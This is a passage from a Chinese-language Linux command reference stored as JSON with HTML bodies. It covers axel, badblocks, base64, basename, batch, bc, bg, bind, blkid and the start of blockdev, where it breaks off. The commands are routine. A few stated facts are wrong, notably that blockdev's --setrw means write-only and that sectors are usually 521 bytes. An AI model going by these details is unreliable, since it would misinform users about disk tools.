        "body": "<h1 id=\"axel\">axel</h1>\n<p>多线程下载工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>axel</strong> 是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内VPS或服务器上下载lnmp一键安装包用Axel就比wget快。</p>\n<h3 id=\"安装\">安装</h3>\n<p>CentOS安装Axel：</p>\n<p>目前yum源上没有Axel，我们可以到 <a href=\"http://pkgs.repoforge.org/axel/\">http://pkgs.repoforge.org/axel/</a> 下载rpm包安装。</p>\n<p>32位CentOS执行下面命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget</span> -c http://pkgs.repoforge.org/axel/axel-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">1</span>.el5.rf.i386.rpm\n<span class=\"hljs-attribute\">rpm</span> -ivh axel-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">1</span>.el5.rf.i386.rpm\n</code></pre>\n<p>64位CentOS执行下面命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget</span> -c http://pkgs.repoforge.org/axel/axel-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">1</span>.el5.rf.x86_64.rpm\n<span class=\"hljs-attribute\">rpm</span> -ivh axel-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">4</span>-<span class=\"hljs-number\">1</span>.el5.rf.x86_64.rpm\n</code></pre>\n<p>Debian/Ubuntu安装Axel：</p>\n<pre><code class=\"language-shell\">apt-<span class=\"hljs-built_in\">get</span> install axel\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">axel <span class=\"hljs-selector-attr\">[options]</span> url1 <span class=\"hljs-selector-attr\">[url2]</span> <span class=\"hljs-selector-attr\">[url...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">--max-speed=x</span> , -<span class=\"hljs-string\">s</span> <span class=\"hljs-string\">x</span>         <span class=\"hljs-comment\"># 最高速度x</span>\n<span class=\"hljs-built_in\">--num-connections=x</span> , -<span class=\"hljs-string\">n</span> <span class=\"hljs-string\">x</span>   <span class=\"hljs-comment\"># 连接数x</span>\n<span class=\"hljs-built_in\">--output=f</span> , -<span class=\"hljs-string\">o</span> <span class=\"hljs-string\">f</span>            <span class=\"hljs-comment\"># 下载为本地文件f</span>\n<span class=\"hljs-built_in\">--search[=x]</span> , -<span class=\"hljs-string\">S</span> [<span class=\"hljs-string\">x</span>]        <span class=\"hljs-comment\"># 搜索镜像</span>\n<span class=\"hljs-built_in\">--header=x</span> , -<span class=\"hljs-string\">H</span> <span class=\"hljs-string\">x</span>            <span class=\"hljs-comment\"># 添加头文件字符串x（指定 HTTP header）</span>\n<span class=\"hljs-built_in\">--user-agent=x</span> , -<span class=\"hljs-string\">U</span> <span class=\"hljs-string\">x</span>        <span class=\"hljs-comment\"># 设置用户代理（指定 HTTP user agent）</span>\n<span class=\"hljs-built_in\">--no-proxy</span> ， -<span class=\"hljs-string\">N</span>             <span class=\"hljs-comment\"># 不使用代理服务器</span>\n<span class=\"hljs-built_in\">--quiet</span> ， -<span class=\"hljs-string\">q</span>                <span class=\"hljs-comment\"># 静默模式</span>\n<span class=\"hljs-built_in\">--verbose</span> ，-<span class=\"hljs-string\">v</span>               <span class=\"hljs-comment\"># 更多状态信息</span>\n<span class=\"hljs-built_in\">--alternate</span> ， -<span class=\"hljs-string\">a</span>            <span class=\"hljs-comment\"># Alternate progress indicator</span>\n<span class=\"hljs-built_in\">--help</span> ，-<span class=\"hljs-string\">h</span>                  <span class=\"hljs-comment\"># 帮助</span>\n<span class=\"hljs-built_in\">--version</span> ，-<span class=\"hljs-string\">V</span>               <span class=\"hljs-comment\"># 版本信息</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>如下载lnmp安装包指定10个线程，存到 <code>/tmp/</code>：</p>\n<pre><code class=\"language-shell\">axel -n <span class=\"hljs-number\">10</span> -o <span class=\"hljs-regexp\">/tmp/</span> http:<span class=\"hljs-regexp\">//</span>www.jsdig.com/lnmp.tar.gz\n</code></pre>\n<p>如果下载过程中下载中断可以再执行下载命令即可恢复上次的下载进度。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "badblocks",
        "des": "查找磁盘中损坏的区块",
        "body": "<h1 id=\"badblocks\">badblocks</h1>\n<p>查找磁盘中损坏的区块</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>badblock命令</strong> 用于查找磁盘中损坏的区块。&nbsp;硬盘是一个损耗设备，当使用一段时间后可能会出现坏道等物理故障。电脑硬盘出现坏道后，如果不及时更换或进行技术处理，坏道就会越来越多，并会造成频繁死机和数据丢失。最好的处理方式是更换磁盘，但在临时的情况下，应及时屏蔽坏道部分的扇区，不要触动它们。badblocks就是一个很好的检查坏道位置的工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">badblock</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;区块大小&gt;：指定磁盘的区块大小，单位为字节；</span>\n<span class=\"hljs-deletion\">-o&lt;输出文件&gt;：将检查的结果写入指定的输出文件；</span>\n<span class=\"hljs-deletion\">-s：在检查时显示进度；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-w：在检查时，执行写入测试。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>磁盘装置：指定要检查的磁盘装置；</li>\n<li>磁盘区块数：指定磁盘装置的区块总数；</li>\n<li>启始区块：指定要从哪个区块开始检查。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>badblocks以 4096 的一个block，每一个block检查16次，将结果输出到“hda-badblocks-list”文件里。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">badblocks</span> -b <span class=\"hljs-number\">4096</span> -c <span class=\"hljs-number\">16</span> /dev/hda1 -o hda-badblocks-list\n</code></pre>\n<p>hda-badblocks-list是个文本文件，内容如下：</p>\n<pre><code class=\"language-shell\">cat hda-badblocks-<span class=\"hljs-type\">list</span>\n<span class=\"hljs-number\">51249</span>\n<span class=\"hljs-number\">51250</span>\n<span class=\"hljs-number\">51251</span>\n<span class=\"hljs-number\">51253</span>\n<span class=\"hljs-number\">51254</span>\n……\n<span class=\"hljs-number\">61245</span>\n……\n</code></pre>\n<p>可以针对可疑的区块多做几次操作。下面，badblocks以4096字节为一个“block”,每一个“block”检查1次, 将结果输出到“hda-badblocks-list.1”文件中，由第51000 block开始，到63000 block结束。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">badblocks</span> -b <span class=\"hljs-number\">4096</span> -c <span class=\"hljs-number\">1</span> /dev/hda1 -o hda-badblocks-list.<span class=\"hljs-number\">1</span> <span class=\"hljs-number\">63000</span> <span class=\"hljs-number\">51000</span>\n</code></pre>\n<p>这次花费的时间比较短，硬盘在指定的情况下在很短的时间就产生“嘎嘎嘎嘎”的响声。由于检查条件的不同，其输出的结果也不完全是相同的。重复几次同样的操作，因条件多少都有些不同，所以结果也有所不同。进行多次操作后，直到产生最后的hda-badblock-list.final文件。</p>\n<h3 id=\"其他\">其他</h3>\n<p><strong>1、fsck使用badblocks的信息</strong> </p>\n<p>badblocks只会在日志文件中标记出坏道的信息，但若希望在检测磁盘时也能跳过这些坏块不检测，可以使用fsck的-l参数：</p>\n<pre><code>fsck.ext3 -l <span class=\"hljs-regexp\">/tmp/</span>hda-badblock-list.<span class=\"hljs-keyword\">final</span> <span class=\"hljs-regexp\">/dev/</span>hda1\n</code></pre>\n<p><strong>2、在创建文件系统前检测坏道</strong> </p>\n<p>badblocks可以随e2fsck和mke2fs的-c删除一起运行（对ext3文件系统也一样），在创建文件系统前就先检测坏道信息：</p>\n<pre><code class=\"language-shell\">mkfs.ext3 -c <span class=\"hljs-regexp\">/dev/</span>hda1\n</code></pre>\n<p>代码表示使用-c在创建文件系统前检查坏道的硬盘。</p>\n<p>这个操作已经很清楚地告知我们可以采用<code>mkfs.ext3 -c</code>选项用<code>read-only</code>方式检查硬盘。这个命令会在格式化硬盘时检查硬盘，并标出错误的硬盘“block”。用这个方法格式化硬盘，需要有相当大的耐心，因为命令运行后，会一个个用读的方式检查硬盘。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "base64",
        "des": "base64 编码/解码文件或标准输入输出",
        "body": "<h1 id=\"base64\">base64</h1>\n<p>base64 编码/解码文件或标准输入输出</p>\n<h3 id=\"描述\">描述</h3>\n<p>base64将<code>文件</code>或<code>标准输入</code>编码或解码为标准输出; </p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">base64 [<span class=\"hljs-keyword\">OPTION</span>]... [<span class=\"hljs-keyword\">FILE</span>]\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--decode</span>         <span class=\"hljs-comment\"># 解码</span>\n-<span class=\"hljs-string\">i</span>, <span class=\"hljs-built_in\">--ignore-garbage</span> <span class=\"hljs-comment\"># 解码时，忽略非字母字符</span>\n-<span class=\"hljs-string\">w</span>, <span class=\"hljs-built_in\">--wrap=COLS</span>      <span class=\"hljs-comment\"># 在指定的字符数后自动换行(默认为76), 0 为禁用自动换行</span>\n\n<span class=\"hljs-built_in\">--help</span>      <span class=\"hljs-comment\"># 显示此帮助说明并退出</span>\n<span class=\"hljs-built_in\">--version</span>   <span class=\"hljs-comment\"># 输出版本信息并退出</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>编码字符串</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-built_in\">printf</span> foo|<span class=\"hljs-built_in\">base64</span>\n</code></pre>\n<p>编码文件</p>\n<pre><code class=\"language-bash\">base64 <span class=\"hljs-built_in\">file</span>\n</code></pre>\n<p>解码</p>\n<pre><code class=\"language-bash\"><span class=\"hljs-built_in\">printf</span> Zm9v|<span class=\"hljs-built_in\">base64</span> -d\n</code></pre>\n<p>解码文件</p>\n<pre><code class=\"language-bash\">base64 -d <span class=\"hljs-built_in\">file</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "basename",
        "des": "打印目录或者文件的基本名称",
        "body": "<h1 id=\"basename\">basename</h1>\n<p>打印目录或者文件的基本名称</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>basename命令</strong> 用于打印目录或者文件的基本名称。basename和dirname命令通常用于shell脚本中的命令替换来指定和指定的输入文件名称有所差异的输出文件名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">basename</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：显示帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>文件：带路径信息的文件；</li>\n<li>后缀：可选参数，指定要去除的文件后缀字符串。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>1、要显示一个shell变量的基本名称，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">basename</span> $WORKFILE\n</code></pre>\n<p>此命令显示指定给shell变量WORKFILE的值的基本名称。如果WORKFILE变量的值是<code>/home/jim/program.c</code>文件，则此命令显示program.c。</p>\n<p>要构造一个和另一个文件名称相同（除了后缀）的文件名称，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">OFILE</span>=`basename <span class=\"hljs-variable\">$1</span> .c`.o\n</code></pre>\n<p>此命令指定给 OFILE 文件第一个位置上的参数（$1）的值，但它的 .c 后缀更改至 .o。如果 $1 是 /home/jim/program.c 文件，则 OFILE 成为 program.o。因为 program.o 仅是一个基本文件名称，它标识在当前目录中的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "batch",
        "des": "在系统不繁忙的时候执行定时任务",
        "body": "<h1 id=\"batch\">batch</h1>\n<p>在系统不繁忙的时候执行定时任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>batch命令</strong> 用于在指定时间，当系统不繁忙时执行任务，用法与at相似。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">batch</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：指定包含具体指令的任务文件；</span>\n<span class=\"hljs-deletion\">-q：指定新任务的队列名称；</span>\n<span class=\"hljs-deletion\">-m：任务执行完后向用户发送E-mail。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>日期时间：指定任务执行的日期时间。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">batch</span> \n<span class=\"hljs-attribute\">at</span>&gt; echo <span class=\"hljs-number\">1234</span>\n<span class=\"hljs-attribute\">at</span>&gt; &lt;EOT&gt;\n<span class=\"hljs-attribute\">job</span> <span class=\"hljs-number\">5</span> at Sun Apr <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">00</span> <span class=\"hljs-number\">2013</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bc",
        "des": "算术操作精密运算工具",
        "body": "<h1 id=\"bc\">bc</h1>\n<p>算术操作精密运算工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bc命令</strong> 是一种支持任意精度的交互执行的计算器语言。bash内置了对整数四则运算的支持，但是并不支持浮点运算，而bc命令可以很方便的进行浮点运算，当然整数运算也不再话下。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bc</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-i：强制进入交互式模式；</span>\n<span class=\"hljs-deletion\">-l：定义使用的标准数学库；</span>\n<span class=\"hljs-deletion\">-w：对POSIX bc的扩展给出警告信息；</span>\n<span class=\"hljs-deletion\">-q：不打印正常的GNU bc环境信息；</span>\n<span class=\"hljs-deletion\">-v：显示指令版本信息；</span>\n<span class=\"hljs-deletion\">-h：显示指令的帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定包含计算任务的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>算术操作高级运算bc命令它可以执行浮点运算和一些高级函数：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">\"1.212*3\"</span> <span class=\"hljs-string\">| bc </span>\n<span class=\"hljs-number\">3.636</span>\n</code></pre>\n<p>设定小数精度（数值范围）</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">\"scale=2;3/8\"</span> <span class=\"hljs-string\">| bc</span>\n<span class=\"hljs-number\">0.37</span>\n</code></pre>\n<p>参数<code>scale=2</code>是将bc输出结果的小数位设置为2位。</p>\n<p>进制转换</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\nabc=192\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"obase=2;<span class=\"hljs-variable\">$abc</span>\"</span> | bc\n</code></pre>\n<p>执行结果为：11000000，这是用bc将十进制转换成二进制。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\nabc=11000000\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"obase=10;ibase=2;<span class=\"hljs-variable\">$abc</span>\"</span> | bc\n</code></pre>\n<p>执行结果为：192，这是用bc将二进制转换为十进制。</p>\n<p>计算平方和平方根：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">\"10^10\"</span> <span class=\"hljs-string\">| bc</span>\necho <span class=\"hljs-string\">\"sqrt(100)\"</span> <span class=\"hljs-string\">| bc</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "bg",
        "des": "将前台终端作业移动到后台运行",
        "body": "<h1 id=\"bg\">bg</h1>\n<p>将前台终端作业移动到后台运行</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">bg </span>[<span class=\"hljs-keyword\">job_spec </span>...]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>用于将作业放到后台运行，使前台可以执行其他任务。该命令的运行效果与在指令后面添加符号<code>&amp;</code>的效果是相同的，都是将其放到系统后台执行。</p>\n</li>\n<li><p>若后台任务中只有一个，则使用该命令时可以省略任务号。</p>\n</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>job_spec（可选）：指定要移动到后台执行的作业标识符，可以是一到多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非未开启作业控制或发生了错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 运行sleep命令，然后按下ctrl+z。</span>\n<span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span>\n^Z\n[<span class=\"hljs-number\">1</span>]+  Stopped                 <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span>\n\n<span class=\"hljs-comment\"># 使用bg命令使得作业在后台运行。</span>\nbg %1\n\n<span class=\"hljs-comment\"># 返回信息：</span>\n[<span class=\"hljs-number\">1</span>]+ <span class=\"hljs-keyword\">sleep</span> <span class=\"hljs-number\">60</span> &amp;\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令需要<code>set</code>选项<code>monitor</code>处于开启状态时才能执行；查看作业控制状态：输入<code>set -o</code>查看<code>monitor</code>行；执行<code>set -o monitor</code>或<code>set -m</code>开启该选项。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "bind",
        "des": "显示或设置键盘按键与其相关的功能",
        "body": "<h1 id=\"bind\">bind</h1>\n<p>显示或设置键盘按键与其相关的功能</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bind命令</strong> 用于显示和设置命令行的键盘序列绑定功能。通过这一命令，可以提高命令行中操作效率。您可以利用bind命令了解有哪些按键组合与其功能，也可以自行指定要用哪些按键组合。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bind</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：显示按键配置的内容；</span>\n<span class=\"hljs-deletion\">-f&lt;按键配置文件&gt;：载入指定的按键配置文件；</span>\n<span class=\"hljs-deletion\">-l：列出所有的功能；</span>\n<span class=\"hljs-deletion\">-m&lt;按键配置&gt;：指定按键配置；</span>\n<span class=\"hljs-deletion\">-q&lt;功能&gt;：显示指定功能的按键；</span>\n<span class=\"hljs-deletion\">-v：列出目前的按键配置与其功能。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">bind</span> -x <span class=\"hljs-string\">'\"\\C-l\":ls -l'</span>    <span class=\"hljs-comment\">#直接按 CTRL+L 就列出目录</span>\n</code></pre>\n<p>其中keyseq可以使用<code>showkey -a</code>命令来获取：</p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># showkey -a</span>\n\n<span class=\"hljs-string\">Press</span> <span class=\"hljs-string\">any</span> <span class=\"hljs-string\">keys</span> <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">Ctrl-D</span> <span class=\"hljs-string\">will</span> <span class=\"hljs-string\">terminate</span> <span class=\"hljs-string\">this</span> <span class=\"hljs-string\">program</span>\n\n<span class=\"hljs-string\">^[[A</span>     <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">0033 </span><span class=\"hljs-number\">0x1b</span>  <span class=\"hljs-string\">上</span>\n         <span class=\"hljs-number\">91</span> <span class=\"hljs-number\">0133 </span><span class=\"hljs-number\">0x5b</span>\n         <span class=\"hljs-number\">65</span> <span class=\"hljs-number\">0101 </span><span class=\"hljs-number\">0x41</span>\n<span class=\"hljs-string\">^[[B</span>     <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">0033 </span><span class=\"hljs-number\">0x1b</span>  <span class=\"hljs-string\">下</span>\n         <span class=\"hljs-number\">91</span> <span class=\"hljs-number\">0133 </span><span class=\"hljs-number\">0x5b</span>\n         <span class=\"hljs-number\">66</span> <span class=\"hljs-number\">0102 </span><span class=\"hljs-number\">0x42</span>\n<span class=\"hljs-string\">^[[D</span>     <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">0033 </span><span class=\"hljs-number\">0x1b</span>  <span class=\"hljs-string\">左</span>\n         <span class=\"hljs-number\">91</span> <span class=\"hljs-number\">0133 </span><span class=\"hljs-number\">0x5b</span>\n         <span class=\"hljs-number\">68</span> <span class=\"hljs-number\">0104 </span><span class=\"hljs-number\">0x44</span>\n<span class=\"hljs-string\">^[[C</span>     <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">0033 </span><span class=\"hljs-number\">0x1b</span> <span class=\"hljs-string\">右</span>\n         <span class=\"hljs-number\">91</span> <span class=\"hljs-number\">0133 </span><span class=\"hljs-number\">0x5b</span>\n         <span class=\"hljs-number\">67</span> <span class=\"hljs-number\">0103 </span><span class=\"hljs-number\">0x43</span>\n         <span class=\"hljs-number\">32</span> <span class=\"hljs-number\">0040 </span><span class=\"hljs-number\">0x20</span>\n<span class=\"hljs-string\">^M</span>       <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">0015 </span><span class=\"hljs-number\">0x0d</span> <span class=\"hljs-string\">字母M</span>\n<span class=\"hljs-string\">^C</span>        <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">0003 </span><span class=\"hljs-number\">0x03</span> <span class=\"hljs-string\">Ctrl-C</span>\n<span class=\"hljs-string\">^D</span>        <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">0004 </span><span class=\"hljs-number\">0x04</span> <span class=\"hljs-string\">Ctrl-D</span> <span class=\"hljs-string\">退出</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "blkid",
        "des": "查看块设备的文件系统类型、LABEL、UUID等信息",
        "body": "<h1 id=\"blkid\">blkid</h1>\n<p>查看块设备的文件系统类型、LABEL、UUID等信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>在Linux下可以使用 <strong>blkid命令</strong> 对查询设备上所采用文件系统类型进行查询。blkid主要用来对系统的块设备（包括交换分区）所使用的文件系统类型、LABEL、UUID等信息进行查询。要使用这个命令必须安装e2fsprogs软件包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">blkid -<span class=\"hljs-symbol\">L</span> | -<span class=\"hljs-symbol\">U</span>\nblkid [-c ] [-ghlLv] [-o] [-s ][-t ] -[w ] [ ...]\nblkid -p [-s ] [-<span class=\"hljs-symbol\">O</span> ] [-<span class=\"hljs-symbol\">S</span> ][-o] ...\nblkid -i [-s ] [-o] ...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>c &lt;file&gt;   <span class=\"hljs-comment\"># 指定cache文件(default: /etc/blkid.tab, /dev/null = none)</span>\n<span class=\"hljs-literal\">-</span>d          <span class=\"hljs-comment\"># don't encode non-printing characters</span>\n<span class=\"hljs-literal\">-</span>h          <span class=\"hljs-comment\"># 显示帮助信息</span>\n<span class=\"hljs-literal\">-</span>g          <span class=\"hljs-comment\"># garbage collect the blkid cache</span>\n<span class=\"hljs-literal\">-</span>o &lt;format&gt; <span class=\"hljs-comment\"># 指定输出格式</span>\n<span class=\"hljs-literal\">-</span>k          <span class=\"hljs-comment\"># list all known filesystems/RAIDs and exit</span>\n<span class=\"hljs-literal\">-</span>s &lt;tag&gt;    <span class=\"hljs-comment\"># 显示指定信息，默认显示所有信息</span>\n<span class=\"hljs-literal\">-</span>t &lt;token&gt;  <span class=\"hljs-comment\"># find device with a specific token (NAME=value pair)</span>\n<span class=\"hljs-literal\">-</span>l          <span class=\"hljs-comment\"># look up only first device with token specified by -t</span>\n<span class=\"hljs-literal\">-</span>L &lt;label&gt;  <span class=\"hljs-comment\"># convert LABEL to device name</span>\n<span class=\"hljs-literal\">-</span>U &lt;uuid&gt;   <span class=\"hljs-comment\"># convert UUID to device name</span>\n<span class=\"hljs-literal\">-</span>v          <span class=\"hljs-comment\"># 显示版本信息</span>\n<span class=\"hljs-literal\">-</span>w &lt;file&gt;   <span class=\"hljs-comment\"># write cache to different file (/dev/null = no write)</span>\n&lt;dev&gt;       <span class=\"hljs-comment\"># specify device(s) to probe (default: all devices)</span>\nLow-level probing options:\n<span class=\"hljs-literal\">-</span>p          <span class=\"hljs-comment\"># low-level superblocks probing (bypass cache)</span>\n<span class=\"hljs-literal\">-</span>i          <span class=\"hljs-comment\"># gather information about I/O limits</span>\n<span class=\"hljs-literal\">-</span>S &lt;size&gt;   <span class=\"hljs-comment\"># overwrite device size</span>\n<span class=\"hljs-literal\">-</span>O &lt;offset&gt; <span class=\"hljs-comment\"># probe at the given offset</span>\n<span class=\"hljs-literal\">-</span>u &lt;list&gt;   <span class=\"hljs-comment\"># filter by \"usage\" (e.g. -u filesystem,raid)</span>\n<span class=\"hljs-literal\">-</span>n &lt;list&gt;   <span class=\"hljs-comment\"># filter by filesystem type (e.g. -n vfat,ext3)</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>1、列出当前系统中所有已挂载文件系统的类型：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo blkid</span>\n</code></pre>\n<p>2、显示指定设备 UUID：</p>\n<pre><code class=\"language-shell\">sudo blkid -s UUID <span class=\"hljs-regexp\">/dev/</span>sda5\n</code></pre>\n<p>3、显示所有设备 UUID：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo blkid -s UUID</span>\n</code></pre>\n<p>4、显示指定设备 LABEL：</p>\n<pre><code class=\"language-shell\">sudo blkid -s LABEL <span class=\"hljs-regexp\">/dev/</span>sda5\n</code></pre>\n<p>5、显示所有设备 LABEL：</p>\n<pre><code class=\"language-shell\">sudo blkid -s <span class=\"hljs-selector-tag\">LABEL</span>\n</code></pre>\n<p>6、显示所有设备文件系统：</p>\n<pre><code class=\"language-shell\">sudo blkid -s <span class=\"hljs-keyword\">TYPE</span>\n</code></pre>\n<p>7、显示所有设备：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo blkid -o device</span>\n</code></pre>\n<p>8、以列表方式查看详细信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo blkid -o list</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "blockdev",
        "des": "从命令行调用区块设备控制程序",
        "body": "<h1 id=\"blockdev\">blockdev</h1>\n<p>从命令行调用区块设备控制程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>blockdev命令</strong> 在命令调用“ioxtls”函数，以实现对设备的控制。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">blockdev</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<p>选项</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-V：打印版本号并退出；</span>\n<span class=\"hljs-deletion\">-q：安静模式；</span>\n<span class=\"hljs-deletion\">-v：详细信息模式；</span>\n<span class=\"hljs-deletion\">--setro：只读；</span>\n<span class=\"hljs-deletion\">--setrw：只写；</span>\n<span class=\"hljs-deletion\">--getro：打印只读状态，“1”表示只读，“0”表示非只读；</span>\n<span class=\"hljs-deletion\">--getss：打印扇区大小。通常为521；</span>\n<span class=\"hljs-deletion\">--flushbufs：刷新缓冲区；</span>\n<span class=\"hljs-deletion\">--rereadpt：重新读取分区表。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备文件名：指定要操作的磁盘的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>设置设备为只读：</p>\n<pre><code class=\"language-shell\">blockdev 